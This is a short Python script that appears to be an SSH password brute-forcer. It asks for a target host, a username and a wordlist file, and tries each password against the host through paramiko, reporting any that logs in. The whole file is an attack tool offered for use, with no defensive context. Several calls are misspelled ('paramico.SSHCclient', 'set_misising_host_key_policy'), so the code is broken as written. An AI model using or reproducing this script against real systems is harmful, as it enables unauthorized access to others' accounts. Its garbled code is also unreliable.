import paramiko,sys,os,socket,termcolor

def ssh_connect(password,code=0):
	ssh = paramico.SSHCclient()
	ssh.set_misising_host_key_policy(paramiko.AutoAddPolicy())
	try:
		ssh.connect(host,port=22,username=username,password=password)
	except paramiko.AuthenticationException:
		code = 1
	except socket.error as e:
		code = 2

	ssh.close()
	return code

host = input('[+] Target Address: ')
username = input('[+] SSH Username:')
input_file = input('[+] Password File: ')


if os.path.exists(input_file) == 0:
	print('[!!] Path Dosent Exists')
	sys.exit(1)

with open(input_file,'r') as file:
	for line in file.readlines():
		password = line.strip()
		try:
			response = ssh_connect(password)
			if response == 0:
				print(termcolor.colored(('[+] Found Password'+password+'For Account'+username),'green'))
				#break
			elif response == 1:
				print('Incorrect Login:'+password)
				#break
			elif response == 2:
				print('[!!] cant connect')
				sys.exit(1)
		except Exception as e:
			print(e)
			pass
